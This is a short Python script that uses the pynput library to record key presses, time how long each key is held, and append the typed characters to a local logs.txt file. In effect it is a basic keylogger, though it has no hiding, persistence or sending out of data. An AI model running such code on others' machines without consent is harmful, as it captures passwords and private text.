import pynput
import time

from pynput.keyboard import Key, Listener
import time

count = 0
keys = []

#t = time.time()
unreleased_keys = []
times = {}
t = time.time()


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    #print("{0} pressed".format(key))
    if key not in unreleased_keys:
        unreleased_keys.append(key)
        track_time(key, 'pressed')
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def track_time(key, token):
    if token == 'pressed':
        times[key] = time.time() - t
    elif token == 'released':
        timePressed = round(time.time()-times[key]-t, 2)
        print("{0} was pressed for {1} seconds long".format(key, timePressed))


def on_release(key):
    if key in unreleased_keys:
        unreleased_keys.remove(key)
        track_time(key, 'released')
    if key == Key.esc:
        return False


def write_file(keys):
    with open("logs.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            else:
                pass


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
